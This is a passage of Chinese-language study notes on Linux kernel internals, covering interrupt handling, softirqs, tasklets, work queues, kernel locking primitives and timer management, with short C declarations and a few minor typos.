<h5 id="绑定一个系统调用的步骤"><a href="#绑定一个系统调用的步骤" class="headerlink" title="绑定一个系统调用的步骤"></a>绑定一个系统调用的步骤</h5><ol>
<li>首先，在系统调用表的最后加入一个表项（计数从0开始）。每种支持该系统调用的硬件体系都必须做这样的工作。</li>
<li>对于所支持的各种体系结构，系统调用号都必须定义于&lt;asm/unistd.h&gt;中。</li>
<li>系统调用必须被编译进内核映像（不能被编译成模块）。即放入kernel/下的一个相关文件中就可以了。</li>
</ol>
<h2 id="内核数据结构"><a href="#内核数据结构" class="headerlink" title="内核数据结构"></a>内核数据结构</h2><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>单向链表和双向链表</p>
<p>环形链表</p>
<p>Linux内核的标准链表就是采用环形双向链表形式实现的。</p>
<p>定义于&lt;linux/list.h&gt;</p>
<h3 id="队列"><a href="#队列" class="headerlink" title="队列"></a>队列</h3><p>队列为FIFO。</p>
<p>定义于&lt;linux/kfifo.h&gt;</p>
<h3 id="映射"><a href="#映射" class="headerlink" title="映射"></a>映射</h3><p>Linux内核提供了简单、有效的映射数据结构，但并非一个通用的映射，因为它的目标是：映射一个唯一的标识数(UID)到一个指针。</p>
<h3 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h3><h4 id="二叉搜索树"><a href="#二叉搜索树" class="headerlink" title="二叉搜索树"></a>二叉搜索树</h4><h4 id="自平衡二叉搜索树"><a href="#自平衡二叉搜索树" class="headerlink" title="自平衡二叉搜索树"></a>自平衡二叉搜索树</h4><h5 id="红黑树"><a href="#红黑树" class="headerlink" title="红黑树"></a>红黑树</h5><h5 id="rbtree"><a href="#rbtree" class="headerlink" title="rbtree"></a>rbtree</h5><p>Linux实现的红黑树叫rbtree，定义于lib/rbtree.c中，声明在&lt;linux/rbtree.h&gt;中。</p>
<h3 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h3><h2 id="中断和中断处理"><a href="#中断和中断处理" class="headerlink" title="中断和中断处理"></a>中断和中断处理</h2><h3 id="中断"><a href="#中断" class="headerlink" title="中断"></a>中断</h3><p>中断使得硬件得以发出通知给处理器。</p>
<p>中断本质上是一种特殊的电信号，由硬件设备发向处理器。处理器接收到中断后，会马上向操作系统反映此信号的到来，然后就由操作系统负责处理这些新到来的数据。内核随时可能因为新到来的中断而被打断。</p>
<p>中断值通常被称为中断请求（IRQ）线。每个IRQ线都会被关联一个数值量。</p>
<h5 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h5><p>异常与中断不同，它在产生时必须考虑与处理器时钟同步。实际上，异常也常常称为同步中断。许多处理器体系结构处理异常与处理中断的方式类似，因此内核对它们的处理也很类似。</p>
<p>在x86体系结构上，通过软中断实现系统调用，那就是陷入内存，然后引起一种特殊的异常——系统调用处理程序异常。</p>
<h3 id="中断处理程序"><a href="#中断处理程序" class="headerlink" title="中断处理程序"></a>中断处理程序</h3><p>在响应一个特定中断的时候，内核会执行一个函数，该函数叫做中断处理程序或中断服务例程。一个设备的中断处理程序是它设备驱动程序的一部分——设备驱动程序是用于对设备进行管理的内核代码。</p>
<p>中断处理程序与其他内核函数的区别在于：中断处理程序是被内核调用来响应中断的，而它们运行于我们称之为中断上下文的特殊上下文中。中断上下文也称作原子上下文，该上下文中的执行代码不可阻塞。</p>
<h3 id="上半部与下半部的对比"><a href="#上半部与下半部的对比" class="headerlink" title="上半部与下半部的对比"></a>上半部与下半部的对比</h3><p>中断处理程序是上半部——接收到一个中断，它就立即开始执行，但只做有严格时限的工作，例如对接受的中断进行应答或复位硬件，这些工作都是在所有中断被禁止的情况下完成的。能够被允许稍后完成的工作会推迟到下半部去。</p>
<h3 id="注册中断处理程序"><a href="#注册中断处理程序" class="headerlink" title="注册中断处理程序"></a>注册中断处理程序</h3><p>驱动程序可以通过request_irq()函数注册一个中断处理程序（声明在&lt;linux/interrupt.h&gt;中）。</p>
<h4 id="中断处理程序标志"><a href="#中断处理程序标志" class="headerlink" title="中断处理程序标志"></a>中断处理程序标志</h4><p>定义于&lt;linux/interrupt.h&gt;中。</p>
<h3 id="释放中断处理程序"><a href="#释放中断处理程序" class="headerlink" title="释放中断处理程序"></a>释放中断处理程序</h3><p>卸载驱动程序时，需要注销相应的中断处理程序，并释放中断线：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free_irq</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> irq, <span class="keyword">void</span> *dev)</span></span></span><br></pre></td></tr></table></figure>

<h3 id="中断上下文"><a href="#中断上下文" class="headerlink" title="中断上下文"></a>中断上下文</h3><h3 id="中断处理机制的实现"><a href="#中断处理机制的实现" class="headerlink" title="中断处理机制的实现"></a>中断处理机制的实现</h3><p><img src="./img/1585836310.png" alt="中断从硬件到内核的路径"></p>
<h3 id="proc-interrupts"><a href="#proc-interrupts" class="headerlink" title="/proc/interrupts"></a>/proc/interrupts</h3><p>该文件存放的是系统中与中断相关的统计信息。</p>
<p>procfs代码位于fs/proc中。</p>
<h3 id="中断控制"><a href="#中断控制" class="headerlink" title="中断控制"></a>中断控制</h3><h4 id="禁止和激活中断"><a href="#禁止和激活中断" class="headerlink" title="禁止和激活中断"></a>禁止和激活中断</h4><p>禁止：local_irq_disable();</p>
<p>激活：local_irq_enable();</p>
<h2 id="下半部和推后执行的工作"><a href="#下半部和推后执行的工作" class="headerlink" title="下半部和推后执行的工作"></a>下半部和推后执行的工作</h2><p>中断处理流程被分为两部分：第一部分是中断处理程序，内核通过对它的异步执行完成对硬件中断的即时响应；另一部分即为下半部。</p>
<h3 id="下半部"><a href="#下半部" class="headerlink" title="下半部"></a>下半部</h3><h4 id="下半部的起源——bottom-half-BH"><a href="#下半部的起源——bottom-half-BH" class="headerlink" title="下半部的起源——bottom half(BH)"></a>下半部的起源——bottom half(BH)</h4><h4 id="任务队列"><a href="#任务队列" class="headerlink" title="任务队列"></a>任务队列</h4><h4 id="软中断和tasklet"><a href="#软中断和tasklet" class="headerlink" title="软中断和tasklet"></a>软中断和tasklet</h4><p>软中断是一组静态定义的下半部接口，有32个，可以在所有处理器上同时执行——即使两个类型相同也可以。必须在编译期间就进行静态注册。</p>
<p>tasklet是一种基于软中断实现的灵活性强、动态创建的下半部实现机制。两个不同类型的tasklet可以在不同的处理器上同时执行，但相同类型的tasklet不能同时执行。可以通过代码进行动态注册。</p>
<h4 id="工作队列"><a href="#工作队列" class="headerlink" title="工作队列"></a>工作队列</h4><h4 id="内核定时器"><a href="#内核定时器" class="headerlink" title="内核定时器"></a>内核定时器</h4><h3 id="软中断"><a href="#软中断" class="headerlink" title="软中断"></a>软中断</h3><p>软中断的代码位于kernel/softirq.c中。</p>
<h4 id="软中断的实现"><a href="#软中断的实现" class="headerlink" title="软中断的实现"></a>软中断的实现</h4><p>软中断是在编译期间静态分配的。</p>
<h5 id="软中断处理程序"><a href="#软中断处理程序" class="headerlink" title="软中断处理程序"></a>软中断处理程序</h5><p>软中断处理程序action的函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">softirq_handler</span><span class="params">(struct softirq_action *)</span></span></span><br></pre></td></tr></table></figure>

<p>当内核运行一个软中断处理程序的时候，它就会执行这个action函数，其唯一的参数为指向相应softirq_action结构体的指针。</p>
<h5 id="执行软中断"><a href="#执行软中断" class="headerlink" title="执行软中断"></a>执行软中断</h5><p>一个注册的软中断必须在被标记后才会执行，。这被称作触发软中断。通常，中断处理程序会在返回前标记它的软中断。</p>
<p>在下列地方，待处理的软中断会被检查和执行：</p>
<ul>
<li>从一个硬件中断代码处返回时</li>
<li>在ksoftirqd内核线程中</li>
<li>在显示检查和执行待处理的软中断的代码中。如网络子系统</li>
</ul>
<p>不管什么办法唤起，软中断都要在do_softirq()中执行。</p>
<h4 id="使用软中断"><a href="#使用软中断" class="headerlink" title="使用软中断"></a>使用软中断</h4><p>软中断保留给系统中对时间要求最严格以及最重要的下半部使用。</p>
<h5 id="分配索引"><a href="#分配索引" class="headerlink" title="分配索引"></a>分配索引</h5><p>索引号小的软中断在索引号大的软中断之前执行。</p>
<p>建立一个新的软中断必须在&lt;linux/interrupt.h&gt;中定义的一个枚举类型中加入新的项。</p>
<h5 id="注册处理程序"><a href="#注册处理程序" class="headerlink" title="注册处理程序"></a>注册处理程序</h5><p>通过调用open_softirq()注册软中断处理程序，该函数含两个参数：软中断的索引号和处理函数。</p>
<p>软中断处理程序执行时，允许响应中断，但它自己不能休眠。在一个处理程序运行的时候，当前处理器上的软中断被禁止，但其他的处理器仍可以执行别的软中断。</p>
<h5 id="触发软中断"><a href="#触发软中断" class="headerlink" title="触发软中断"></a>触发软中断</h5><p>raise_softirq()函数可以将一个软中断设置为挂起状态，让它在下次调用do_softirq()函数时投入运行。</p>
<h3 id="tasklet"><a href="#tasklet" class="headerlink" title="tasklet"></a>tasklet</h3><h4 id="tasklet的实现"><a href="#tasklet的实现" class="headerlink" title="tasklet的实现"></a>tasklet的实现</h4><h5 id="tasklet结构体"><a href="#tasklet结构体" class="headerlink" title="tasklet结构体"></a>tasklet结构体</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tasklet_struct</span> *<span class="title">next</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> state;</span><br><span class="line">	<span class="keyword">atomic_t</span> count;</span><br><span class="line">	<span class="keyword">void</span> (*func)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中state只能在0、TASKLET_STATE_SCHED（已被调度，正准备投入运行）和TASKLET_STATE_RUN（正在运行）之间取值。</p>
<p>若count不为0，则tasklet被禁止，不允许执行。当count为0时，tasklet被激活，并且在设置为挂起状态时，该tasklet才能够执行。</p>
<h5 id="调度tasklet"><a href="#调度tasklet" class="headerlink" title="调度tasklet"></a>调度tasklet</h5><p>已调度的tasklet存放在两个单处理器数据结构：tasklet_vec（普通）和tasklet_hi_vec（高优先级）。这两个数据结构都是由tasklet_struct结构体构成的量表。链表中每个tasklet_struct代表一个不同的tasklet。</p>
<p>tasklet由tasklet_schedule()和tasklet_hi_scheduler()函数进行调度。</p>
<p>tasklet_schedule()的执行步骤：</p>
<ol>
<li>检查tasklet的状态是否为TASKLET_STATE_SCHED。如果是，说明tasklet已被调度过了，函数立即返回。</li>
<li>调用_tasklet_schedule()。</li>
<li>保存中断状态，然后禁止本地中断。</li>
<li>把需要调度的tasklet加到每个处理器一个的tasklet_vec链表或tasklet_hi_vec链表的表头上去。</li>
<li>唤起TASKLET_SOFTIRQ或HI_SOFTIRQ软中断，这样在下一次调用do_softirq()时就会执行该tasklet。</li>
<li>恢复中断到原状态并返回。</li>
</ol>
<p>tasklet_action()和tasklet_hi_action()：</p>
<ol>
<li>禁止中断，并为当前处理器检索tasklet_vec或tasklet_hig_vec链表。</li>
<li>将当前处理器上的该链表设置为NULL，达到清空的效果。</li>
<li>允许响应中断。</li>
<li>循环遍历获得链表上的每一个待处理的tasklet。</li>
<li>如果是多处理器系统，通过检查TASKLET_STATE_RUN来判断这个tasklet是否正在其他处理器上运行。如果它正在运行，那么现在就不要执行，跳到下一个待处理器的tasklet去。</li>
<li>如果当前这个tasklet没有执行，将其状态设置为TASKLET_STATE_RUN。</li>
<li>检查count值是否为0，确保tasklet没有被禁止；如果被禁止了，则跳转到下一个挂起的tasklet去。</li>
<li>执行tasklet的处理器程序。</li>
<li>tasklet运行完毕，清楚state域的TASK_STATE_RUN状态标志。</li>
<li>重复执行下一个tasklet，直至没有剩余等待处理的tasklet。</li>
</ol>
<h4 id="使用tasklet"><a href="#使用tasklet" class="headerlink" title="使用tasklet"></a>使用tasklet</h4><h5 id="声明一个tasklet"><a href="#声明一个tasklet" class="headerlink" title="声明一个tasklet"></a>声明一个tasklet</h5><p>静态创建（&lt;linux/interruot.h&gt;中定义）：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DECLARE_TASKLET(name, func, data);	<span class="comment">//count = 0</span></span><br><span class="line">DECLARE_TASKLET_DISABLED(name, func, data);	<span class="comment">//count = 1</span></span><br></pre></td></tr></table></figure>

<p>动态创建：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">tasklet_init(t, tasklet_handler, dev);</span><br></pre></td></tr></table></figure>

<h5 id="编写tasklet处理程序"><a href="#编写tasklet处理程序" class="headerlink" title="编写tasklet处理程序"></a>编写tasklet处理程序</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tasklet_handler</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> data)</span></span></span><br></pre></td></tr></table></figure>

<h5 id="调度tasklet-1"><a href="#调度tasklet-1" class="headerlink" title="调度tasklet"></a>调度tasklet</h5><p>一个tasklet总在调度它的处理器上执行，以希望能更好地利用处理器的高速缓存。</p>
<p>可以调用tasklet_disable()来禁止某个指定的tasklet（若该tasklet正在执行，这个函数会等到它执行完毕再返回）。tasklet_disable_nosync()函数也可以用来禁止，无须在返回前等待tasklet执行完毕。</p>
<p>tasklet_enable()可以激活一个tasklet。</p>
<p>tasklet_kill()函数可以从挂起的队列中去掉一个tasklet。这个函数首先等待该tasklet执行完毕，然后再将它移去。</p>
<h5 id="ksoftirqd"><a href="#ksoftirqd" class="headerlink" title="ksoftirqd"></a>ksoftirqd</h5><p>每个cpu上都分配有一个ksoftirqd/n线程。一旦该线程被初始化，会执行死循环（优先级较低）。只要有待处理的软中断，ksoftirqd就会调用do_softirq()去处理。当所有需要执行的操作都完成以后，该内核线程将自己设置为TASK_INTERRUPTIBLE状态，唤起调度程序选择其他可执行进程投入运行。</p>
<p>只要do_softirq()函数发现一家执行过的内核线程重新出发了它自己，软中断内核线程就会被唤醒。</p>
<h4 id="老的BH机制"><a href="#老的BH机制" class="headerlink" title="老的BH机制"></a>老的BH机制</h4><h3 id="工作队列-1"><a href="#工作队列-1" class="headerlink" title="工作队列"></a>工作队列</h3><p>工作队列可以把工作推后，交由一个内核线程去执行。工作队列允许重新调度甚至是睡眠。</p>
<h4 id="工作队列的实现"><a href="#工作队列的实现" class="headerlink" title="工作队列的实现"></a>工作队列的实现</h4><p>工作队列子系统是一个用于创建内核线程的接口，通过它创建的进程负责执行由内核其他部分排到队列里的任务。创建的这些内核线程称作工作者线程。</p>
<h5 id="表示线程的数据结构"><a href="#表示线程的数据结构" class="headerlink" title="表示线程的数据结构"></a>表示线程的数据结构</h5><p>工作者线程的结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span>&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_strcut</span> <span class="title">cpu_wq</span>[<span class="title">NR_CPUS</span>];</span>	<span class="comment">//定义在kernel/workqueue.c中</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">	<span class="keyword">int</span> sinqlethread;</span><br><span class="line">	<span class="keyword">int</span> freezeable;</span><br><span class="line">	<span class="keyword">int</span> rt;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h5 id="表示工作的数据结构"><a href="#表示工作的数据结构" class="headerlink" title="表示工作的数据结构"></a>表示工作的数据结构</h5><p>工作用&lt;linux/workqueue.h&gt;中定义的work_struct结构体表示：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span></span><br><span class="line">	<span class="keyword">work_func_t</span> func;</span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure>

<p>worker_thread()：</p>
<ol>
<li>线程将自己设置为休眠状态，并把自己加入到等待队列中。</li>
<li>如果工作链表是空的，线程调用schedule()函数进入睡眠状态。</li>
<li>如果链表中有对象，线程不会睡眠，它将自己设置成TASK_RUNNING，脱离等待队列。</li>
<li>如果链表非空，调用run_workqueue()函数执行被推后的工作。</li>
</ol>
<p>run_workqueue()函数遍历链表上每个待处理的工作，执行链表每个节点上的workqueue_struct中的func成员。</p>
<p><img src="./img/1586338843.png" alt="工作、工作队列和工作者线程之间的关系"></p>
<h4 id="使用工作队列"><a href="#使用工作队列" class="headerlink" title="使用工作队列"></a>使用工作队列</h4><h5 id="创建推后的工作"><a href="#创建推后的工作" class="headerlink" title="创建推后的工作"></a>创建推后的工作</h5><p>静态创建</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DECLARE_WORK(name, <span class="keyword">void</span> (*func) (<span class="keyword">void</span> *), <span class="keyword">void</span> *data);</span><br></pre></td></tr></table></figure>

<p>动态创建</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">INIT_WORK(struct work_struct *work, <span class="keyword">void</span>(*func) (<span class="keyword">void</span> *), <span class="keyword">void</span> *data)</span><br></pre></td></tr></table></figure>

<h5 id="工作队列处理函数"><a href="#工作队列处理函数" class="headerlink" title="工作队列处理函数"></a>工作队列处理函数</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">work_handler</span><span class="params">(<span class="keyword">void</span> *data)</span></span></span><br></pre></td></tr></table></figure>

<h5 id="对工作进程调度"><a href="#对工作进程调度" class="headerlink" title="对工作进程调度"></a>对工作进程调度</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">schedule_work(&amp;work);	<span class="comment">//立即执行</span></span><br><span class="line"></span><br><span class="line">schedule_delayed_work(&amp;work, <span class="built_in">delay</span>);	<span class="comment">//延迟执行</span></span><br></pre></td></tr></table></figure>

<h5 id="刷新操作"><a href="#刷新操作" class="headerlink" title="刷新操作"></a>刷新操作</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">flush_scheduled_work</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>执行后函数会一直等到，直到队列中所有对象都被执行以后才返回。</p>
<p>注：该函数并不取消任何延迟执行任务。取消延迟执行工作应调用：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cancel_delayed_work</span><span class="params">(struct work_struct *work)</span></span>;</span><br></pre></td></tr></table></figure>

<h5 id="创建新的工作队列"><a href="#创建新的工作队列" class="headerlink" title="创建新的工作队列"></a>创建新的工作队列</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">struct workqueue_struct *<span class="title">create_workqueue</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span>;</span><br></pre></td></tr></table></figure>

<p>调度：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_work</span><span class="params">(struct workqueue_struct *wq, struct work_struct *work)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">queue_delat_work</span><span class="params">(struct workqueue_struct *wq, struct work_struct *work,unsignde <span class="keyword">long</span> <span class="built_in">delay</span>)</span></span>;</span><br></pre></td></tr></table></figure>

<p>刷新：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flush_workqueue(struct workqueue_struct *wq);</span><br></pre></td></tr></table></figure>

<h2 id="内核同步介绍"><a href="#内核同步介绍" class="headerlink" title="内核同步介绍"></a>内核同步介绍</h2><h3 id="临界区和条件竞争"><a href="#临界区和条件竞争" class="headerlink" title="临界区和条件竞争"></a>临界区和条件竞争</h3><p>临界区就是访问和操作共享数据的代码段。</p>
<p>避免并发和防止条件竞争称为同步。</p>
<h3 id="加锁"><a href="#加锁" class="headerlink" title="加锁"></a>加锁</h3><p>内核中造成并发执行的原因：</p>
<ul>
<li>中断</li>
<li>软中断和tasklet</li>
<li>内核抢占</li>
<li>睡眠及用户空间的同步</li>
<li>对称多处理</li>
</ul>
<h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><h3 id="争用和扩展性"><a href="#争用和扩展性" class="headerlink" title="争用和扩展性"></a>争用和扩展性</h3><p>锁的争用（简称争用），是指当锁正在被占用时，有其他线程试图获得该锁。</p>
<h2 id="内核同步方法"><a href="#内核同步方法" class="headerlink" title="内核同步方法"></a>内核同步方法</h2><h3 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h3><p>原子操作即不能被分割的指令。</p>
<h4 id="原子整数操作"><a href="#原子整数操作" class="headerlink" title="原子整数操作"></a>原子整数操作</h4><p>针对整数的原子操作只能对atomic_t类型的数据进行处理。atomic_t类型定义在&lt;linux/types.h&gt;中：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> counter;</span><br><span class="line">&#125; <span class="keyword">atomic_t</span>;</span><br></pre></td></tr></table></figure>

<p>原子整数操作的声明都在&lt;asm/atomic.h&gt;中。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">atomic_set(&amp;v,<span class="number">4</span>);	<span class="comment">//v = 4;</span></span><br><span class="line">atomic_add(<span class="number">2</span>,&amp;v);	<span class="comment">//v = v + 2;</span></span><br><span class="line">atomic_inc(&amp;v);		<span class="comment">//v = v + 1;</span></span><br></pre></td></tr></table></figure>

<p>可用atomic_read()将atomic_t转换为int型。</p>
<h4 id="64位原子操作"><a href="#64位原子操作" class="headerlink" title="64位原子操作"></a>64位原子操作</h4><p>atomic64_t：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">long</span> counter;</span><br><span class="line">&#125; <span class="keyword">atomic64_t</span>;</span><br></pre></td></tr></table></figure>

<h4 id="原子位操作"><a href="#原子位操作" class="headerlink" title="原子位操作"></a>原子位操作</h4><p>定义在&lt;asm/bitops.h&gt;中。</p>
<h3 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h3><p>自旋锁最多只能被一个可执行线程持有。</p>
<p>一个被争用的自旋锁使得请求它的线程在等待锁重新可用时自旋。</p>
<h4 id="自旋锁方法"><a href="#自旋锁方法" class="headerlink" title="自旋锁方法"></a>自旋锁方法</h4><p>自旋锁的实现与体系结构密切相关，与体系结构相关的代码定义在&lt;asm/spinlock.h&gt;中，接口定义在&lt;linux/spinlock.h&gt;中。自旋锁的基本使用形式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DEFINE_SPINLOCK(mr_lock);</span><br><span class="line">spin_lock(&amp;mr_lock);</span><br><span class="line">...</span><br><span class="line">spin_unlock(&amp;mr_lock);</span><br></pre></td></tr></table></figure>

<p>自旋锁可以使用在中断处理程序中。所以在中断处理程序中使用自旋锁时，一定要在获取锁之前，首先禁止本地中断：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DEFINE_SPINLOCK(mr_lock);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">spin_lock_irqsave(&amp;mr_lock, flags);</span><br><span class="line">...</span><br><span class="line">spin_unlock_irqrestore(&amp;mr_lock, flags);</span><br></pre></td></tr></table></figure>

<h4 id="其他针对自旋锁的操作"><a href="#其他针对自旋锁的操作" class="headerlink" title="其他针对自旋锁的操作"></a>其他针对自旋锁的操作</h4><h4 id="自旋锁和下半部"><a href="#自旋锁和下半部" class="headerlink" title="自旋锁和下半部"></a>自旋锁和下半部</h4><h3 id="读-写自旋锁"><a href="#读-写自旋锁" class="headerlink" title="读-写自旋锁"></a>读-写自旋锁</h3><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>Linux中的信号量是一种睡眠锁：如果有一个任务试图获得一个不可用（已被占用）的信号量时，信号量会将其推进一个等待队列，然后让其睡眠。当持有的信号量可用（被释放）后，处于等待队列中 的那个任务将被唤醒，并获得该信号量。</p>
<h4 id="计数信号量和二值信号量"><a href="#计数信号量和二值信号量" class="headerlink" title="计数信号量和二值信号量"></a>计数信号量和二值信号量</h4><p>二值信号量又称互斥信号量。</p>
<h4 id="创建和初始化信号量"><a href="#创建和初始化信号量" class="headerlink" title="创建和初始化信号量"></a>创建和初始化信号量</h4><p>信号量的实现与体系结构相关，具体定义在&lt;asm/semaphore.h&gt;。</p>
<h4 id="使用信号量"><a href="#使用信号量" class="headerlink" title="使用信号量"></a>使用信号量</h4><h3 id="读-写信号量"><a href="#读-写信号量" class="headerlink" title="读-写信号量"></a>读-写信号量</h3><p>定义在文件&lt;linux/rwsem.h&gt;中。</p>
<p>所有的读-写信号量都是互斥信号量。</p>
<h3 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h3><h3 id="完成变量"><a href="#完成变量" class="headerlink" title="完成变量"></a>完成变量</h3><p>完成变量由结构completion表示，定义在&lt;linux/completion.h&gt;中。</p>
<h3 id="BKL：大内核锁"><a href="#BKL：大内核锁" class="headerlink" title="BKL：大内核锁"></a>BKL：大内核锁</h3><p>BKL的一些特性：</p>
<ul>
<li><p>持有BKL的任务仍然可睡眠。</p>
</li>
<li><p>BKL是一种递归锁。</p>
</li>
<li><p>BKL只可以用在进程上下文中。</p>
</li>
<li><p>新的用户不允许使用BKL</p>
</li>
</ul>
<p>BKL在被持有时同样会禁止内核抢占。</p>
<h3 id="顺序锁"><a href="#顺序锁" class="headerlink" title="顺序锁"></a>顺序锁</h3><h3 id="禁止抢占"><a href="#禁止抢占" class="headerlink" title="禁止抢占"></a>禁止抢占</h3><h3 id="顺序和屏障"><a href="#顺序和屏障" class="headerlink" title="顺序和屏障"></a>顺序和屏障</h3><p>rmb()方法提供了一个“读”内存屏障，它确保跨越rmb()的载入动作不会发生重排序。</p>
<p>wmb()方式提供是一个“写”内存屏障，区别仅仅是它是针对存储而非载入——它确保跨越屏障的存储不发生重排序。</p>
<p>mb()方法既提供了读屏障也提供了写屏障。载入和存储动作都不会跨越屏障重新排序。</p>
<h2 id="定时器和时间管理"><a href="#定时器和时间管理" class="headerlink" title="定时器和时间管理"></a>定时器和时间管理</h2><p>系统定时器是一种可编程硬件芯片，它能以固定频率产生中断。该中断就是所谓的定时器中断。</p>
<h3 id="内核中的时间概念"><a href="#内核中的时间概念" class="headerlink" title="内核中的时间概念"></a>内核中的时间概念</h3><h3 id="节拍率：HZ"><a href="#节拍率：HZ" class="headerlink" title="节拍率：HZ"></a>节拍率：HZ</h3><p>内核在&lt;asm/param.h&gt;中定义了这个值</p>
<h3 id="Jiffies"><a href="#Jiffies" class="headerlink" title="Jiffies"></a>Jiffies</h3><p>全局变量jiffies用来记录自系统启动以来产生的节拍总数。启动时，内核将该变量初始化为0。</p>
<p>定义在&lt;linux/jiffies.h&gt;中。</p>
<h4 id="用户空间和HZ"><a href="#用户空间和HZ" class="headerlink" title="用户空间和HZ"></a>用户空间和HZ</h4><h3 id="硬时钟和定时器"><a href="#硬时钟和定时器" class="headerlink" title="硬时钟和定时器"></a>硬时钟和定时器</h3><h4 id="实时时钟"><a href="#实时时钟" class="headerlink" title="实时时钟"></a>实时时钟</h4><p>实时时钟(RTC)是用来持久存放系统时间的设备，即便系统关闭后，它也可以靠主板上的微型电池提供的电力保持系统的计时。在PC体系结构中，RTC和CMOS集成在一起，而且RTC的运行和BIOS的保持设置都是通过一个电池供电的。</p>
<h4 id="系统定时器"><a href="#系统定时器" class="headerlink" title="系统定时器"></a>系统定时器</h4><p>在x86体系结构中，主要采用可编程中断时钟(PIT)。PIT在PC机器中普遍存在。内核在启动时对PIT进行编程初始化，使其能够以HZ/秒的频率产生时钟中断。</p>
<h3 id="时钟中断处理程序"><a href="#时钟中断处理程序" class="headerlink" title="时钟中断处理程序"></a>时钟中断处理程序</h3><p>时钟中断处理程序可以划分为两个部分：体系结构相关部分和体系结构无关部分。</p>
<p>与体系结构相关的例程作为系统定时器的中断处理程序而注册到内核中，以便在产生时钟中断时，它能够相应地运行：</p>
<ul>
<li>获得xtime_lock锁，以便对访问jiffies_64和墙上时间xtime进行保护。</li>
<li>需要时应答或重新设置系统时钟。</li>
<li>周期性地使用墙上时间更新实时时钟。</li>
<li>调用体系结构无关的时钟例程：tick_periodic()。</li>
</ul>
<p>中断处理程序主要通过调用与体系结构无关的例程，tick_periodic()执行下面更多工作：</p>
<ul>
<li>给jiffies_64变量加一。</li>
<li>更新资源消耗的统计值，比如当前进程所消耗的系统时间和用户时间。</li>
<li>执行已经到期的动态定时器。</li>
<li>执行sheduler_tick()函数。</li>
<li>更新墙上时间，该时间存放在xtime变量中。</li>
<li>计算平均负载值。</li>
</ul>
<h3 id="实际时间"><a href="#实际时间" class="headerlink" title="实际时间"></a>实际时间</h3><p>当前实际时间（墙上时间）定义在文件kernel/time/timekeeping.c中。</p>
